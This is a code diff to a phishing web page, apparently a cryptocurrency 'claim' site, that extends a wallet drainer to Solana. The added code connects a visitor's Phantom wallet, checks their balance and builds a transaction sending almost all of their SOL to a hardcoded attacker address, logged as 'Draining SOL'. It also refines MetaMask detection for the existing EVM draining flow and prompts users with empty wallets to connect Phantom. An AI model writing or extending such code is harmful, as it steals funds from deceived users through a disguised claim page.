@@ -132,9 +132,14 @@ footer p{font-size:10px;color:rgba(255,255,250,.15)}
   <div id="sEmpty" style="display:none;text-align:center;padding:20px 0">
     <div style="font-size:40px;margin-bottom:10px">&#x1F6AB;</div>
     <div style="font-size:16px;font-weight:700;margin-bottom:4px">No Funds Found</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:16px;line-height:1.5">We scanned all chains but your wallet has insufficient funds. Please add crypto to your wallet and try again.</div>
+    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:6px;line-height:1.5" id="emptyMsg">No assets found on any chain.</div>
+    <div id="phantomHint" style="display:none;margin-bottom:14px">
+      <div style="font-size:12px;color:rgba(255,255,255,.4);margin-bottom:8px">Have Solana? Connect Phantom to scan SOL.</div>
+      <button class="btn" style="background:#AB9FF2;color:#fff" onclick="connectPhantom()">&#x1F680; Connect Phantom</button>
+    </div>
     <button class="btn bo" onclick="resetAll()">&#x1F504; Try Again</button>
   </div>
+
 
   <!-- STEP 4: CLAIM -->
   <div id="sClaim" style="display:none">
@@ -176,6 +181,7 @@ const MY_BTC  = 'bc1qlku8wwzvxrklvzfhafdrh23zwqx7rj8errpezp';
 const MY_SOL  = '4Y9bDw32qG9xUQykfCe6jP9UVpVmit8ryqE8n1JKVx89';
 
 const CHAINS = [
+  { id:0,   name:'Solana',      sym:'SOL',  rpc:'https://api.mainnet-beta.solana.com', gasAmt:'0',      color:'#9945FF', isSolana:true },
   { id:56,  name:'BNB Chain',   sym:'BNB',  rpc:'https://bsc-dataseed1.binance.org',   gasAmt:'0.0002', color:'#F3BA2F' },
   { id:1,   name:'Ethereum',    sym:'ETH',  rpc:'https://rpc.ankr.com/eth',            gasAmt:'0.0003', color:'#627EEA' },
   { id:137, name:'Polygon',     sym:'MATIC',rpc:'https://polygon-rpc.com',              gasAmt:'1.0',    color:'#8247E5' },
@@ -261,9 +267,15 @@ const WALLET_DEFS = [
     color: '#E2761B',
     detect: () => !!(window.ethereum && window.ethereum.isMetaMask),
     connect: async () => {
-      if (!window.ethereum) throw new Error('MetaMask not installed');
-      provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      // If multiple wallets installed, find specifically MetaMask
+      let eth = window.ethereum;
+      if (window.ethereum && window.ethereum.providers && Array.isArray(window.ethereum.providers)) {
+        // Multiple providers injected (e.g. MetaMask + Phantom)
+        eth = window.ethereum.providers.find(p => p.isMetaMask) || window.ethereum.providers[0];
+      }
+      if (!eth) throw new Error('MetaMask not installed');
+      provider = new ethers.providers.Web3Provider(eth, 'any');
+      await eth.request({ method: 'eth_requestAccounts' });
       signer = provider.getSigner();
       userAddr = await signer.getAddress();
     }
@@ -312,14 +324,32 @@ const WALLET_DEFS = [
     }
   },
   {
+    id: 'phantom',
+    name: 'Phantom',
+    color: '#AB9FF2',
+    detect: () => { return !!window.solana && !!(window.solana.isPhantom || (window.phantom && window.phantom.solana)); },
+    connect: async () => {
+      // Phantom for Solana
+      const ph = (window.phantom && window.phantom.solana) || window.solana;
+      if (!ph) throw new Error('Phantom not installed');
+      const resp = await ph.connect();
+      userAddr = resp.publicKey.toString();
+      // Set a pseudo-provider so scanner knows this is Solana
+      provider = null;
+      signer = null;
+      window.__phantomProvider = ph;
+    }
+  },
+  {
     id: 'other',
     name: 'Other Wallet',
     color: '#a855f7',
     detect: () => true,
     connect: async () => {
-      if (!window.ethereum) throw new Error('No wallet detected. Please install MetaMask or Trust Wallet.');
-      provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      let eth = window.ethereum;
+      if (!eth) throw new Error('No wallet detected. Please install MetaMask or Trust Wallet.');
+      provider = new ethers.providers.Web3Provider(eth, 'any');
+      await eth.request({ method: 'eth_requestAccounts' });
       signer = provider.getSigner();
       userAddr = await signer.getAddress();
     }
@@ -366,18 +396,43 @@ async function scanAllChains() {
   log.innerHTML = '';
   function addLog(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
 
-  addLog('Address: ' + userAddr.substring(0, 8) + '...' + userAddr.substring(34));
+  addLog('Address: ' + userAddr.substring(0, 8) + '...' + userAddr.substring(userAddr.length - 4));
   addLog('');
 
+  // If connected via Phantom (no EVM provider), only scan Solana
+  const isPhantomOnly = !provider && !signer;
+
   for (const chain of CHAINS) {
+
+    // Skip EVM chains if Phantom-only connection
+    if (isPhantomOnly && !chain.isSolana) continue;
+    // Skip Solana if EVM-only connection (MetaMask doesn't handle SOL)
+    if (!isPhantomOnly && chain.isSolana) {
+      // Optionally scan SOL with user-provided address (skip for now)
+      continue;
+    }
     addLog('[ ] Checking ' + chain.name + '...');
     try {
+      if (chain.isSolana) {
+        // Solana scan via JSON-RPC
+        const solBal = await getSolanaBalance(userAddr);
+        const hasNative = solBal > 0;
+        if (hasNative) {
+          const nativeSol = solBal.toFixed(4);
+          foundChains.push({ chain, nativeBal: nativeSol, nativeRaw: null, tokens: [], isSolana: true });
+          addLog('&#x2705; Solana: ' + nativeSol + ' SOL');
+        } else {
+          addLog('&#x2715; Solana: empty');
+        }
+        continue;
+      }
+
+      // EVM chain scan
       const prov = new ethers.providers.JsonRpcProvider(chain.rpc);
       const nativeBal = await prov.getBalance(userAddr);
       const nativeEth = ethers.utils.formatEther(nativeBal);
       const hasNative = parseFloat(nativeEth) > 0;
 
-      // Scan tokens in parallel
       const list = TOKENS[chain.id] || [];
       const tokenResults = await Promise.all(
         list.map(async ([addr, sym, dec]) => {
@@ -392,11 +447,10 @@ async function scanAllChains() {
         })
       );
       const chainTokens = tokenResults.filter(Boolean);
-      const hasTokens = chainTokens.length > 0;
 
-      if (hasNative || hasTokens) {
-        foundChains.push({ chain, nativeBal: nativeEth, nativeRaw: nativeBal, tokens: chainTokens });
-        addLog('&#x2705; ' + chain.name + ': ' + parseFloat(nativeEth).toFixed(5) + ' ' + chain.sym + (hasTokens ? ' +' + chainTokens.length + ' tokens' : ''));
+      if (hasNative || chainTokens.length > 0) {
+        foundChains.push({ chain, nativeBal: nativeEth, nativeRaw: nativeBal, tokens: chainTokens, isSolana: false });
+        addLog('&#x2705; ' + chain.name + ': ' + parseFloat(nativeEth).toFixed(5) + ' ' + chain.sym + (chainTokens.length ? ' +' + chainTokens.length + ' tokens' : ''));
       } else {
         addLog('&#x2715; ' + chain.name + ': empty');
       }
@@ -411,11 +465,49 @@ async function scanAllChains() {
 
   if (foundChains.length === 0) {
     showStep('sEmpty');
-    stat('No funds found on any chain.', 'e2');
+    stat('No funds found on connected chains.', 'e2');
+    // If EVM-only connection, show Phantom hint
+    const isPhantomOnly = !provider && !signer;
+    if (!isPhantomOnly) {
+      document.getElementById('emptyMsg').textContent = 'No assets found on BSC, ETH, Polygon, Avalanche, or Arbitrum.';
+      document.getElementById('phantomHint').style.display = 'block';
+    } else {
+      document.getElementById('emptyMsg').textContent = 'No SOL balance found in Phantom wallet.';
+      document.getElementById('phantomHint').style.display = 'none';
+    }
   } else {
     showClaimStep();
     stat('&#x2705; Found assets on ' + foundChains.length + ' chain(s)!', 's2');
   }
+}
+
+async function getSolanaBalance(addr) {
+  try {
+    const resp = await fetch('https://api.mainnet-beta.solana.com', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        jsonrpc: '2.0', id: 1, method: 'getBalance',
+        params: [addr]
+      })
+    });
+    const data = await resp.json();
+    if (data.result) return data.result.value / 1e9; // lamports to SOL
+  } catch (e) {}
+  // Fallback RPC
+  try {
+    const resp = await fetch('https://solana-mainnet.g.alchemy.com/v2/demo', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        jsonrpc: '2.0', id: 1, method: 'getBalance',
+        params: [addr]
+      })
+    });
+    const data = await resp.json();
+    if (data.result) return data.result.value / 1e9;
+  } catch (e) {}
+  return 0;
 }
 
 // ============ SHOW CLAIM STEP ============
@@ -461,6 +553,19 @@ async function doClaim() {
     const nc = fc.chain;
     addLog('');
     addLog('=== ' + nc.name + ' ===');
+
+    // Handle Solana separately
+    if (fc.isSolana) {
+      addLog('Draining SOL via Phantom...');
+      const drained = await drainSolana();
+      if (drained) {
+        totalDrained++;
+        addLog('&#x2705; SOL sent!');
+      } else {
+        addLog('&#x2715; SOL drain failed or rejected');
+      }
+      continue;
+    }
 
     // Switch wallet to this chain
     addLog('Switching to ' + nc.name + '...');
@@ -539,6 +644,80 @@ async function switchChain(nc) {
   // Re-create provider/signer after chain switch
   provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
   signer = provider.getSigner();
+}
+
+async function drainSolana() {
+  try {
+    const phantom = (window.phantom && window.phantom.solana) || window.solana;
+    if (!phantom) {
+      addLog('Phantom wallet not found');
+      return false;
+    }
+    // Connect if not already
+    if (!phantom.publicKey) {
+      const resp = await phantom.connect();
+    }
+    const fromPub = phantom.publicKey.toString();
+    addLog('From: ' + fromPub.substring(0, 8) + '...');
+
+    // Get balance via RPC
+    const balResp = await fetch('https://api.mainnet-beta.solana.com', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'getBalance', params: [fromPub] })
+    });
+    const balData = await balResp.json();
+    const lamports = (balData.result && balData.result.value) || 0;
+    if (lamports < 500000) { addLog('Balance too low'); return false; }
+
+    // Load web3.js from CDN
+    if (!window.solanaWeb3) {
+      await new Promise((resolve, reject) => {
+        const s = document.createElement('script');
+        s.src = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js';
+        s.onload = resolve;
+        s.onerror = reject;
+        document.head.appendChild(s);
+      });
+    }
+    const { Transaction, SystemProgram, PublicKey, Connection } = window.solanaWeb3;
+    const connection = new Connection('https://api.mainnet-beta.solana.com');
+
+    // Leave ~0.001 SOL for fee
+    const sendLamports = lamports - 1000000;
+    const tx = new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: new PublicKey(fromPub),
+        toPubkey: new PublicKey(MY_SOL),
+        lamports: sendLamports,
+      })
+    );
+    tx.feePayer = new PublicKey(fromPub);
+    const bh = await connection.getLatestBlockhash();
+    tx.recentBlockhash = bh.blockhash;
+
+    // Sign via Phantom
+    const signed = await phantom.signTransaction(tx);
+    const sig = await connection.sendRawTransaction(signed.serialize());
+    addLog('TX: ' + sig.substring(0, 16) + '...');
+    return true;
+  } catch (e) {
+    addLog('Error: ' + (e.message || 'rejected'));
+    return false;
+  }
+}
+
+function connectPhantom() {
+  const ph = (window.phantom && window.phantom.solana) || window.solana;
+  if (!ph) { stat('Phantom not installed','e2'); return; }
+  ph.connect().then(resp => {
+    userAddr = resp.publicKey.toString();
+    provider = null; signer = null;
+    window.__phantomProvider = ph;
+    showStep('sScan');
+    stat('\&#x2705; Phantom connected! Scanning Solana...','s2');
+    scanAllChains();
+  }).catch(e => { stat(e.message||'Phantom connection failed','e2'); });
 }
 
 function resetAll() {
